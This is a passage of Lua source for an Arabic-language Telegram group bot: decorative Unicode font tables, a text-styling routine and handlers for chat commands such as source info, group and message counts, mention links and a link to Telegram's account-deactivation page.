        "α,♭,ⓒ,∂,є,ⓕ,ⓖ,ℌ,ḯ,ⓙ,ḱ,ł,ⓜ,и,ⓞ,ⓟ,ⓠ,ⓡ,ⓢ,⊥,ʊ,ⓥ,ⓦ,ж,ⓨ,ⓩ,α,♭,ⓒ,∂,є,ⓕ,ⓖ,ℌ,ḯ,ⓙ,ḱ,ł,ⓜ,и,ⓞ,ⓟ,ⓠ,ⓡ,ⓢ,⊥,ʊ,ⓥ,ⓦ,ж,ⓨ,ⓩ,0,➒,➑,➆,➅,➎,➍,➌,➁,➀,.,_",
		"ⓐ,ß,ḉ,∂,℮,ⓕ,❡,ⓗ,ї,נ,ḱ,ł,μ,η,ø,ρ,ⓠ,я,﹩,ⓣ,ц,√,ⓦ,✖️,૪,ℨ,ⓐ,ß,ḉ,∂,℮,ⓕ,❡,ⓗ,ї,נ,ḱ,ł,μ,η,ø,ρ,ⓠ,я,﹩,ⓣ,ц,√,ⓦ,✖️,૪,ℨ,0,➒,➑,➐,➅,➄,➍,➂,➁,➊,.,_",
        "α,ß,ⓒ,ⅾ,ℯ,ƒ,ℊ,ⓗ,ї,ʝ,к,ʟ,ⓜ,η,ⓞ,℘,ⓠ,ґ,﹩,т,υ,ⓥ,ⓦ,ж,ⓨ,ẕ,α,ß,ⓒ,ⅾ,ℯ,ƒ,ℊ,ⓗ,ї,ʝ,к,ʟ,ⓜ,η,ⓞ,℘,ⓠ,ґ,﹩,т,υ,ⓥ,ⓦ,ж,ⓨ,ẕ,0,➈,➇,➐,➅,➎,➍,➌,➁,➊,.,_",
        "@,♭,ḉ,ⅾ,є,ⓕ,❡,н,ḯ,נ,ⓚ,ⓛ,м,ⓝ,☺️,ⓟ,ⓠ,я,ⓢ,⊥,υ,♥️,ẘ,ϰ,૪,ⓩ,@,♭,ḉ,ⅾ,є,ⓕ,❡,н,ḯ,נ,ⓚ,ⓛ,м,ⓝ,☺️,ⓟ,ⓠ,я,ⓢ,⊥,υ,♥️,ẘ,ϰ,૪,ⓩ,0,➒,➑,➆,➅,➄,➃,➂,➁,➀,.,_",
        "ⓐ,♭,ḉ,ⅾ,є,ƒ,ℊ,ℌ,ḯ,ʝ,ḱ,ł,μ,η,ø,ⓟ,ⓠ,ґ,ⓢ,т,ⓤ,√,ⓦ,✖️,ⓨ,ẕ,ⓐ,♭,ḉ,ⅾ,є,ƒ,ℊ,ℌ,ḯ,ʝ,ḱ,ł,μ,η,ø,ⓟ,ⓠ,ґ,ⓢ,т,ⓤ,√,ⓦ,✖️,ⓨ,ẕ,0,➈,➇,➐,➅,➄,➃,➂,➁,➀,.,_",
		"ձ,ъƈ,ժ,ε,բ,ց,հ,ﻨ,յ,ĸ,l,ო,ռ,օ,թ,զ,г,ร,է,ս,ν,ա,×,ყ,২,ձ,ъƈ,ժ,ε,բ,ց,հ,ﻨ,յ,ĸ,l,ო,ռ,օ,թ,զ,г,ร,է,ս,ν,ա,×,ყ,২,0,9,8,7,6,5,4,3,2,1,.,_",
"λ,ϐ,ς,d,ε,ғ,ϑ,ɢ,н,ι,ϳ,κ,l,ϻ,π,σ,ρ,φ,г,s,τ,υ,v,ш,ϰ,ψ,z,λ,ϐ,ς,d,ε,ғ,ϑ,ɢ,н,ι,ϳ,κ,l,ϻ,π,σ,ρ,φ,г,s,τ,υ,v,ш,ϰ,ψ,z,0,9,8,7,6,5,4,3,2,1,.,_",
"ค,๒,ς,๔,є,Ŧ,ɠ,ђ,เ,ן,к,l,๓,ภ,๏,թ,ợ,г,ร,t,ย,v,ฬ,x,ץ,z,ค,๒,ς,๔,є,Ŧ,ɠ,ђ,เ,ן,к,l,๓,ภ,๏,թ,ợ,г,ร,t,ย,v,ฬ,x,ץ,z,0,9,8,7,6,5,4,3,2,1,.,_",
"მ,ჩ,ƈძ,ε,բ,ց,հ,ἶ,ʝ,ƙ,l,ო,ղ,օ,ր,գ,ɾ,ʂ,է,մ,ν,ω,ჯ,ყ,z,მ,ჩ,ƈძ,ε,բ,ց,հ,ἶ,ʝ,ƙ,l,ო,ղ,օ,ր,գ,ɾ,ʂ,է,մ,ν,ω,ჯ,ყ,z,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",
"ค,ც,८,ძ,૯,Բ,૭,Һ,ɿ,ʆ,қ,Ն,ɱ,Ո,૦,ƿ,ҩ,Ր,ς,੮,υ,౮,ω,૪,ע,ઽ,ค,ც,८,ძ,૯,Բ,૭,Һ,ɿ,ʆ,қ,Ն,ɱ,Ո,૦,ƿ,ҩ,Ր,ς,੮,υ,౮,ω,૪,ע,ઽ,0,9,8,7,6,5,4,3,2,1,.,_",
"Λ,Б,Ͼ,Ð,Ξ,Ŧ,g,h,ł,j,К,Ł,m,Л,Ф,p,Ǫ,Я,s,t,u,v,Ш,Ж,Џ,z,Λ,Б,Ͼ,Ð,Ξ,Ŧ,g,h,ł,j,К,Ł,m,Л,Ф,p,Ǫ,Я,s,t,u,v,Ш,Ж,Џ,z,0,9,8,7,6,5,4,3,2,1,.,_",
"λ,ß,Ȼ,ɖ,ε,ʃ,Ģ,ħ,ί,ĵ,κ,ι,ɱ,ɴ,Θ,ρ,ƣ,ર,Ș,τ,Ʋ,ν,ώ,Χ,ϓ,Հ,λ,ß,Ȼ,ɖ,ε,ʃ,Ģ,ħ,ί,ĵ,κ,ι,ɱ,ɴ,Θ,ρ,ƣ,ર,Ș,τ,Ʋ,ν,ώ,Χ,ϓ,Հ,0,9,8,7,6,5,4,3,2,1,.,_",
"ª,b,¢,Þ,È,F,૬,ɧ,Î,j,Κ,Ļ,м,η,◊,Ƿ,ƍ,r,S,⊥,µ,√,w,×,ý,z,ª,b,¢,Þ,È,F,૬,ɧ,Î,j,Κ,Ļ,м,η,◊,Ƿ,ƍ,r,S,⊥,µ,√,w,×,ý,z,0,9,8,7,6,5,4,3,2,1,.,_",
"Թ,Յ,Շ,Ժ,ȝ,Բ,Գ,ɧ,ɿ,ʝ,ƙ,ʅ,ʍ,Ռ,Ծ,ρ,φ,Ր,Տ,Ե,Մ,ע,ա,Ճ,Վ,Հ,Թ,Յ,Շ,Ժ,ȝ,Բ,Գ,ɧ,ɿ,ʝ,ƙ,ʅ,ʍ,Ռ,Ծ,ρ,φ,Ր,Տ,Ե,Մ,ע,ա,Ճ,Վ,Հ,0,9,8,7,6,5,4,3,2,1,.,_",
"Λ,Ϧ,ㄈ,Ð,Ɛ,F,Ɠ,н,ɪ,ﾌ,Қ,Ł,௱,Л,Ø,þ,Ҩ,尺,ら,Ť,Ц,Ɣ,Ɯ,χ,Ϥ,Ẕ,Λ,Ϧ,ㄈ,Ð,Ɛ,F,Ɠ,н,ɪ,ﾌ,Қ,Ł,௱,Л,Ø,þ,Ҩ,尺,ら,Ť,Ц,Ɣ,Ɯ,χ,Ϥ,Ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
"Ǟ,в,ट,D,ę,բ,g,৸,i,j,κ,l,ɱ,П,Φ,Р,q,Я,s,Ʈ,Ц,v,Щ,ж,ყ,ւ,Ǟ,в,ट,D,ę,բ,g,৸,i,j,κ,l,ɱ,П,Φ,Р,q,Я,s,Ʈ,Ц,v,Щ,ж,ყ,ւ,0,9,8,7,6,5,4,3,2,1,.,_",
"ɒ,d,ɔ,b,ɘ,ʇ,ϱ,н,i,į,ʞ,l,м,и,o,q,p,я,ƨ,т,υ,v,w,x,γ,z,ɒ,d,ɔ,b,ɘ,ʇ,ϱ,н,i,į,ʞ,l,м,и,o,q,p,я,ƨ,т,υ,v,w,x,γ,z,0,9,8,7,6,5,4,3,2,1,.,_",
"Æ,þ,©,Ð,E,F,ζ,Ħ,Ї,¿,ズ,ᄂ,M,Ñ,Θ,Ƿ,Ø,Ґ,Š,τ,υ,¥,w,χ,y,շ,Æ,þ,©,Ð,E,F,ζ,Ħ,Ї,¿,ズ,ᄂ,M,Ñ,Θ,Ƿ,Ø,Ґ,Š,τ,υ,¥,w,χ,y,շ,0,9,8,7,6,5,4,3,2,1,.,_",
"ª,ß,¢,ð,€,f,g,h,¡,j,k,|,m,ñ,¤,Þ,q,®,$,t,µ,v,w,×,ÿ,z,ª,ß,¢,ð,€,f,g,h,¡,j,k,|,m,ñ,¤,Þ,q,®,$,t,µ,v,w,×,ÿ,z,0,9,8,7,6,5,4,3,2,1,.,_",
"ɐ,q,ɔ,p,ǝ,ɟ,ɓ,ɥ,ı,ſ,ʞ,ๅ,ɯ,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,ɐ,q,ɔ,p,ǝ,ɟ,ɓ,ɥ,ı,ſ,ʞ,ๅ,ɯ,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,0,9,8,7,6,5,4,3,2,1,.,_",
"⒜,⒝,⒞,⒟,⒠,⒡,⒢,⒣,⒤,⒥,⒦,⒧,⒨,⒩,⒪,⒫,⒬,⒭,⒮,⒯,⒰,⒱,⒲,⒳,⒴,⒵,⒜,⒝,⒞,⒟,⒠,⒡,⒢,⒣,⒤,⒥,⒦,⒧,⒨,⒩,⒪,⒫,⒬,⒭,⒮,⒯,⒰,⒱,⒲,⒳,⒴,⒵,⒪,⑼,⑻,⑺,⑹,⑸,⑷,⑶,⑵,⑴,.,_",
"ɑ,ʙ,c,ᴅ,є,ɻ,მ,ʜ,ι,ɿ,ĸ,г,w,и,o,ƅϭ,ʁ,ƨ,⊥,n,ʌ,ʍ,x,⑃,z,ɑ,ʙ,c,ᴅ,є,ɻ,მ,ʜ,ι,ɿ,ĸ,г,w,и,o,ƅϭ,ʁ,ƨ,⊥,n,ʌ,ʍ,x,⑃,z,0,9,8,7,6,5,4,3,2,1,.,_",
"4,8,C,D,3,F,9,H,!,J,K,1,M,N,0,P,Q,R,5,7,U,V,W,X,Y,2,4,8,C,D,3,F,9,H,!,J,K,1,M,N,0,P,Q,R,5,7,U,V,W,X,Y,2,0,9,8,7,6,5,4,3,2,1,.,_",
"Λ,ßƇ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,♡,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ßƇ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,♡,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",
"α,в,¢,đ,e,f,g,ħ,ı,נ,κ,ł,м,и,ø,ρ,q,я,š,т,υ,ν,ω,χ,ч,z,α,в,¢,đ,e,f,g,ħ,ı,נ,κ,ł,м,и,ø,ρ,q,я,š,т,υ,ν,ω,χ,ч,z,0,9,8,7,6,5,4,3,2,1,.,_",
"α,в,c,ɔ,ε,ғ,ɢ,н,ı,נ,κ,ʟ,м,п,σ,ρ,ǫ,я,ƨ,т,υ,ν,ш,х,ч,z,α,в,c,ɔ,ε,ғ,ɢ,н,ı,נ,κ,ʟ,м,п,σ,ρ,ǫ,я,ƨ,т,υ,ν,ш,х,ч,z,0,9,8,7,6,5,4,3,2,1,.,_",
"【a】,【b】,【c】,【d】,【e】,【f】,【g】,【h】,【i】,【j】,【k】,【l】,【m】,【n】,【o】,【p】,【q】,【r】,【s】,【t】,【u】,【v】,【w】,【x】,【y】,【z】,【a】,【b】,【c】,【d】,【e】,【f】,【g】,【h】,【i】,【j】,【k】,【l】,【m】,【n】,【o】,【p】,【q】,【r】,【s】,【t】,【u】,【v】,【w】,【x】,【y】,【z】,【0】,【9】,【8】,【7】,【6】,【5】,【4】,【3】,【2】,【1】,.,_",
"[̲̲̅̅a̲̅,̲̅b̲̲̅,̅c̲̅,̲̅d̲̲̅,̅e̲̲̅,̅f̲̲̅,̅g̲̅,̲̅h̲̲̅,̅i̲̲̅,̅j̲̲̅,̅k̲̅,̲̅l̲̲̅,̅m̲̅,̲̅n̲̅,̲̅o̲̲̅,̅p̲̅,̲̅q̲̅,̲̅r̲̲̅,̅s̲̅,̲̅t̲̲̅,̅u̲̅,̲̅v̲̅,̲̅w̲̅,̲̅x̲̅,̲̅y̲̅,̲̅z̲̅,[̲̲̅̅a̲̅,̲̅b̲̲̅,̅c̲̅,̲̅d̲̲̅,̅e̲̲̅,̅f̲̲̅,̅g̲̅,̲̅h̲̲̅,̅i̲̲̅,̅j̲̲̅,̅k̲̅,̲̅l̲̲̅,̅m̲̅,̲̅n̲̅,̲̅o̲̲̅,̅p̲̅,̲̅q̲̅,̲̅r̲̲̅,̅s̲̅,̲̅t̲̲̅,̅u̲̅,̲̅v̲̅,̲̅w̲̅,̲̅x̲̅,̲̅y̲̅,̲̅z̲̅,̲̅0̲̅,̲̅9̲̲̅,̅8̲̅,̲̅7̲̅,̲̅6̲̅,̲̅5̲̅,̲̅4̲̅,̲̅3̲̲̅,̅2̲̲̅,̅1̲̲̅̅],.,_",
"[̺͆a̺͆͆,̺b̺͆͆,̺c̺͆,̺͆d̺͆,̺͆e̺͆,̺͆f̺͆͆,̺g̺͆,̺͆h̺͆,̺͆i̺͆,̺͆j̺͆,̺͆k̺͆,̺l̺͆͆,̺m̺͆͆,̺n̺͆͆,̺o̺͆,̺͆p̺͆͆,̺q̺͆͆,̺r̺͆͆,̺s̺͆͆,̺t̺͆͆,̺u̺͆͆,̺v̺͆͆,̺w̺͆,̺͆x̺͆,̺͆y̺͆,̺͆z̺,[̺͆a̺͆͆,̺b̺͆͆,̺c̺͆,̺͆d̺͆,̺͆e̺͆,̺͆f̺͆͆,̺g̺͆,̺͆h̺͆,̺͆i̺͆,̺͆j̺͆,̺͆k̺͆,̺l̺͆͆,̺m̺͆͆,̺n̺͆͆,̺o̺͆,̺͆p̺͆͆,̺q̺͆͆,̺r̺͆͆,̺s̺͆͆,̺t̺͆͆,̺u̺͆͆,̺v̺͆͆,̺w̺͆,̺͆x̺͆,̺͆y̺͆,̺͆z̺,̺͆͆0̺͆,̺͆9̺͆,̺͆8̺̺͆͆7̺͆,̺͆6̺͆,̺͆5̺͆,̺͆4̺͆,̺͆3̺͆,̺͆2̺͆,̺͆1̺͆],.,_",
"̛̭̰̃ã̛̰̭,̛̭̰̃b̛̰̭̃̃,̛̭̰c̛̛̰̭̃̃,̭̰d̛̰̭̃,̛̭̰̃ḛ̛̭̃̃,̛̭̰f̛̰̭̃̃,̛̭̰g̛̰̭̃̃,̛̭̰h̛̰̭̃,̛̭̰̃ḭ̛̛̭̃̃,̭̰j̛̰̭̃̃,̛̭̰k̛̰̭̃̃,̛̭̰l̛̰̭,̛̭̰̃m̛̰̭̃̃,̛̭̰ñ̛̛̰̭̃,̭̰ỡ̰̭̃,̛̭̰p̛̰̭̃,̛̭̰̃q̛̰̭̃̃,̛̭̰r̛̛̰̭̃̃,̭̰s̛̰̭,̛̭̰̃̃t̛̰̭̃,̛̭̰̃ữ̰̭̃,̛̭̰ṽ̛̰̭̃,̛̭̰w̛̛̰̭̃̃,̭̰x̛̰̭̃,̛̭̰̃ỹ̛̰̭̃,̛̭̰z̛̰̭̃̃,̛̛̭̰ã̛̰̭,̛̭̰̃b̛̰̭̃̃,̛̭̰c̛̛̰̭̃̃,̭̰d̛̰̭̃,̛̭̰̃ḛ̛̭̃̃,̛̭̰f̛̰̭̃̃,̛̭̰g̛̰̭̃̃,̛̭̰h̛̰̭̃,̛̭̰̃ḭ̛̛̭̃̃,̭̰j̛̰̭̃̃,̛̭̰k̛̰̭̃̃,̛̭̰l̛̰̭,̛̭̰̃m̛̰̭̃̃,̛̭̰ñ̛̛̰̭̃,̭̰ỡ̰̭̃,̛̭̰p̛̰̭̃,̛̭̰̃q̛̰̭̃̃,̛̭̰r̛̛̰̭̃̃,̭̰s̛̰̭,̛̭̰̃̃t̛̰̭̃,̛̭̰̃ữ̰̭̃,̛̭̰ṽ̛̰̭̃,̛̭̰w̛̛̰̭̃̃,̭̰x̛̰̭̃,̛̭̰̃ỹ̛̰̭̃,̛̭̰z̛̰̭̃̃,̛̭̰0̛̛̰̭̃̃,̭̰9̛̰̭̃̃,̛̭̰8̛̛̰̭̃̃,̭̰7̛̰̭̃̃,̛̭̰6̛̰̭̃̃,̛̭̰5̛̰̭̃,̛̭̰̃4̛̰̭̃,̛̭̰̃3̛̰̭̃̃,̛̭̰2̛̰̭̃̃,̛̭̰1̛̰̭̃,.,_",
"a,ะb,ะc,ะd,ะe,ะf,ะg,ะh,ะi,ะj,ะk,ะl,ะm,ะn,ะo,ะp,ะq,ะr,ะs,ะt,ะu,ะv,ะw,ะx,ะy,ะz,a,ะb,ะc,ะd,ะe,ะf,ะg,ะh,ะi,ะj,ะk,ะl,ะm,ะn,ะo,ะp,ะq,ะr,ะs,ะt,ะu,ะv,ะw,ะx,ะy,ะz,ะ0,ะ9,ะ8,ะ7,ะ6,ะ5,ะ4,ะ3,ะ2,ะ1ะ,.,_",
"̑ȃ,̑b̑,̑c̑,̑d̑,̑ȇ,̑f̑,̑g̑,̑h̑,̑ȋ,̑j̑,̑k̑,̑l̑,̑m̑,̑n̑,̑ȏ,̑p̑,̑q̑,̑ȓ,̑s̑,̑t̑,̑ȗ,̑v̑,̑w̑,̑x̑,̑y̑,̑z̑,̑ȃ,̑b̑,̑c̑,̑d̑,̑ȇ,̑f̑,̑g̑,̑h̑,̑ȋ,̑j̑,̑k̑,̑l̑,̑m̑,̑n̑,̑ȏ,̑p̑,̑q̑,̑ȓ,̑s̑,̑t̑,̑ȗ,̑v̑,̑w̑,̑x̑,̑y̑,̑z̑,̑0̑,̑9̑,̑8̑,̑7̑,̑6̑,̑5̑,̑4̑,̑3̑,̑2̑,̑1̑,.,_",
"~a,͜͝b,͜͝c,͜͝d,͜͝e,͜͝f,͜͝g,͜͝h,͜͝i,͜͝j,͜͝k,͜͝l,͜͝m,͜͝n,͜͝o,͜͝p,͜͝q,͜͝r,͜͝s,͜͝t,͜͝u,͜͝v,͜͝w,͜͝x,͜͝y,͜͝z,~a,͜͝b,͜͝c,͜͝d,͜͝e,͜͝f,͜͝g,͜͝h,͜͝i,͜͝j,͜͝k,͜͝l,͜͝m,͜͝n,͜͝o,͜͝p,͜͝q,͜͝r,͜͝s,͜͝t,͜͝u,͜͝v,͜͝w,͜͝x,͜͝y,͜͝z,͜͝0,͜͝9,͜͝8,͜͝7,͜͝6,͜͝5,͜͝4,͜͝3,͜͝2͜,͝1͜͝~,.,_",
"̤̈ä̤,̤̈b̤̈,̤̈c̤̈̈,̤d̤̈,̤̈ë̤,̤̈f̤̈,̤̈g̤̈̈,̤ḧ̤̈,̤ï̤̈,̤j̤̈,̤̈k̤̈̈,̤l̤̈,̤̈m̤̈,̤̈n̤̈,̤̈ö̤,̤̈p̤̈,̤̈q̤̈,̤̈r̤̈,̤̈s̤̈̈,̤ẗ̤̈,̤ṳ̈,̤̈v̤̈,̤̈ẅ̤,̤̈ẍ̤,̤̈ÿ̤,̤̈z̤̈,̤̈ä̤,̤̈b̤̈,̤̈c̤̈̈,̤d̤̈,̤̈ë̤,̤̈f̤̈,̤̈g̤̈̈,̤ḧ̤̈,̤ï̤̈,̤j̤̈,̤̈k̤̈̈,̤l̤̈,̤̈m̤̈,̤̈n̤̈,̤̈ö̤,̤̈p̤̈,̤̈q̤̈,̤̈r̤̈,̤̈s̤̈̈,̤ẗ̤̈,̤ṳ̈,̤̈v̤̈,̤̈ẅ̤,̤̈ẍ̤,̤̈ÿ̤,̤̈z̤̈,̤̈0̤̈,̤̈9̤̈,̤̈8̤̈,̤̈7̤̈,̤̈6̤̈,̤̈5̤̈,̤̈4̤̈,̤̈3̤̈,̤̈2̤̈̈,̤1̤̈,.,_",
"≋̮̑ȃ̮,̮̑b̮̑,̮̑c̮̑,̮̑d̮̑,̮̑ȇ̮,̮̑f̮̑,̮̑g̮̑,̮̑ḫ̑,̮̑ȋ̮,̮̑j̮̑,̮̑k̮̑,̮̑l̮̑,̮̑m̮̑,̮̑n̮̑,̮̑ȏ̮,̮̑p̮̑,̮̑q̮̑,̮̑r̮,̮̑̑s̮,̮̑̑t̮,̮̑̑u̮,̮̑̑v̮̑,̮̑w̮̑,̮̑x̮̑,̮̑y̮̑,̮̑z̮̑,≋̮̑ȃ̮,̮̑b̮̑,̮̑c̮̑,̮̑d̮̑,̮̑ȇ̮,̮̑f̮̑,̮̑g̮̑,̮̑ḫ̑,̮̑ȋ̮,̮̑j̮̑,̮̑k̮̑,̮̑l̮̑,̮̑m̮̑,̮̑n̮̑,̮̑ȏ̮,̮̑p̮̑,̮̑q̮̑,̮̑r̮,̮̑̑s̮,̮̑̑t̮,̮̑̑u̮,̮̑̑v̮̑,̮̑w̮̑,̮̑x̮̑,̮̑y̮̑,̮̑z̮̑,̮̑0̮̑,̮̑9̮̑,̮̑8̮̑,̮̑7̮̑,̮̑6̮̑,̮̑5̮̑,̮̑4̮̑,̮̑3̮̑,̮̑2̮̑,̮̑1̮̑≋,.,_",
"a̮,̮b̮̮,c̮̮,d̮̮,e̮̮,f̮̮,g̮̮,ḫ̮,i̮,j̮̮,k̮̮,l̮,̮m̮,̮n̮̮,o̮,̮p̮̮,q̮̮,r̮̮,s̮,̮t̮̮,u̮̮,v̮̮,w̮̮,x̮̮,y̮̮,z̮̮,a̮,̮b̮̮,c̮̮,d̮̮,e̮̮,f̮̮,g̮̮,ḫ̮i,̮̮,j̮̮,k̮̮,l̮,̮m̮,̮n̮̮,o̮,̮p̮̮,q̮̮,r̮̮,s̮,̮t̮̮,u̮̮,v̮̮,w̮̮,x̮̮,y̮̮,z̮̮,0̮̮,9̮̮,8̮̮,7̮̮,6̮̮,5̮̮,4̮̮,3̮̮,2̮̮,1̮,.,_",
"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",
"Â,ß,Ĉ,Ð,Є,Ŧ,Ǥ,Ħ,Ī,ʖ,Қ,Ŀ,♏,И,Ø,P,Ҩ,R,$,ƚ,Ц,V,Щ,X,￥,Ẕ,Â,ß,Ĉ,Ð,Є,Ŧ,Ǥ,Ħ,Ī,ʖ,Қ,Ŀ,♏,И,Ø,P,Ҩ,R,$,ƚ,Ц,V,Щ,X,￥,Ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
	}
	-------------------------------faeder
	local result = {}
		i=0
		for k=1,#fonts do
			i=i+1
			local tar_font = fonts[i]:split(",")
			local text = TextToBeauty
		local text = text:gsub("A",tar_font[1])
		local text = text:gsub("B",tar_font[2])
		local text = text:gsub("C",tar_font[3])
		local text = text:gsub("D",tar_font[4])
		local text = text:gsub("E",tar_font[5])
		local text = text:gsub("F",tar_font[6])
		local text = text:gsub("G",tar_font[7])
		local text = text:gsub("H",tar_font[8])
		local text = text:gsub("I",tar_font[9])
		local text = text:gsub("J",tar_font[10])
		local text = text:gsub("K",tar_font[11])
		local text = text:gsub("L",tar_font[12])
		local text = text:gsub("M",tar_font[13])
		local text = text:gsub("N",tar_font[14])
		local text = text:gsub("O",tar_font[15])
		local text = text:gsub("P",tar_font[16])
		local text = text:gsub("Q",tar_font[17])
		local text = text:gsub("R",tar_font[18])
		local text = text:gsub("S",tar_font[19])
		local text = text:gsub("T",tar_font[20])
		local text = text:gsub("U",tar_font[21])
		local text = text:gsub("V",tar_font[22])
		local text = text:gsub("W",tar_font[23])
		local text = text:gsub("X",tar_font[24])
		local text = text:gsub("Y",tar_font[25])
		local text = text:gsub("Z",tar_font[26])
		local text = text:gsub("a",tar_font[27])
		local text = text:gsub("b",tar_font[28])
		local text = text:gsub("c",tar_font[29])
		local text = text:gsub("d",tar_font[30])
		local text = text:gsub("e",tar_font[31])
		local text = text:gsub("f",tar_font[32])
		local text = text:gsub("g",tar_font[33])
		local text = text:gsub("h",tar_font[34])
		local text = text:gsub("i",tar_font[35])
		local text = text:gsub("j",tar_font[36])
		local text = text:gsub("k",tar_font[37])
		local text = text:gsub("l",tar_font[38])
		local text = text:gsub("m",tar_font[39])
		local text = text:gsub("n",tar_font[40])
		local text = text:gsub("o",tar_font[41])
		local text = text:gsub("p",tar_font[42])
		local text = text:gsub("q",tar_font[43])
		local text = text:gsub("r",tar_font[44])
		local text = text:gsub("s",tar_font[45])
		local text = text:gsub("t",tar_font[46])
		local text = text:gsub("u",tar_font[47])
		local text = text:gsub("v",tar_font[48])
		local text = text:gsub("w",tar_font[49])
		local text = text:gsub("x",tar_font[50])
		local text = text:gsub("y",tar_font[51])
		local text = text:gsub("z",tar_font[52])
		local text = text:gsub("0",tar_font[53])
		local text = text:gsub("9",tar_font[54])
		local text = text:gsub("8",tar_font[55])
		local text = text:gsub("7",tar_font[56])
		local text = text:gsub("6",tar_font[57])
		local text = text:gsub("5",tar_font[58])
		local text = text:gsub("4",tar_font[59])
		local text = text:gsub("3",tar_font[60])
		local text = text:gsub("2",tar_font[61])
		local text = text:gsub("1",tar_font[62])
			table.insert(result, text)
		end
		
		local result_text = "🚦⁞ الكلمه • "..TextToBeauty.." •\n🎖⁞ تم زخرفتها  "..tostring(#fonts).." نوع •\n\n"
		for v=1,#result do
			result_text = result_text..v.." - "..result[v].."\n"
		end
		result_text = result_text
faederdx(msg.chat_id_, msg.id_, 1, result_text, 1, 'md')
	end
        ---------------------------------------------faeder--------------------------------------------------
        if text:match("^مشاهده المنشور$") then
          database:set('bot:viewget'..msg.sender_user_id_,true)
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '> Plese forward your post : ', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '??|| ارسل لي المنشور الان 🎗', 1, 'md')
          end
        end
        ----- faeder
        if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") then
   
   local text =  [[
🚦⁞ مرحبا بك في سورس فايدر التحديث الجديد •

📠⁞  طريقه التنصيب في الاسفل •

[💰⁞  اضغط هنا لتنصيب السورس •](https://t.me/joinchat/AAAAAEy5f7GaJDiooN1V5w)


[🗳⁞ مطور السورس •](t.me/pro_c9)
[🗳⁞ تواصل المحظورين •](t.me/ll750kll_bot)

[🗳⁞ قناة السورس •](t.me/faeder_ch)
[🗳⁞ قناة التحديثات •](t.me/team_faeder)

[🗳⁞  كروب الدعم •](https://t.me/joinchat/B0N8JVDKF5xb_oaNcValyQ)
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
  --------faeder
  if text:match("^[Gg][Rr][Oo][Uu][Pp][Ss]$") and is_admin(msg.sender_user_id_, msg.chat_id_) or text:match("^الكروبات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
    local gps = database:scard("bot:groups")
 local users = database:scard("bot:userss")
    local allmgs = database:get("bot:allmsgs")
                if database:get('lang:gp:'..msg.chat_id_) then
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ *Groups :*  '..gps..'', 1, 'md')
                 else
      faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ عدد كروبات البوت هو *{ '..gps..' }*', 1, 'md')
end
 end
 
if  text:match("^[Mm]sg$") or text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  then
local user_msgs = database:get('user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
    if database:get('lang:gp:'..msg.chat_id_) then
  faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ welcome my dear •\n📬⁞ you have {*"..user_msgs.." }* msg •\n📖⁞ in group •", 1, 'md')
    else 
  faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ اهلا وسهلا عزيزي •\n📬⁞ لديك {*"..user_msgs.." }* رساله •\n📖⁞ في المجموعه •", 1, 'md')
end
 end
 -------faeder
 if text:match('^الحساب (%d+)$') then
        local id = text:match('^الحساب (%d+)$')
        local text = 'اضغط لمشاهده العضو 🎈'
      tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
   end
   --------------faeder
   if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then
   
   local text =  [[
🚦⁞ رابط حذف التلي •
🎖⁞ براحتك هو انت تطرب ع الحذف •
📖⁞ [• اضغط هنا لحذف الحساب •](https://telegram.org/deactivate) •
🎁⁞ [• اضغط هنا لديك مفاجئه •](https://t.me/joinchat/AAAAAEyMJ12Ep2akX37-aA) •
🎁⁞ [• اضغط هنا لديك مفاجئه اخرى •](https://t.me/joinchat/AAAAAEDJCeBNNDdScN-_sg) •
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
  ------------------faeder
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") then 
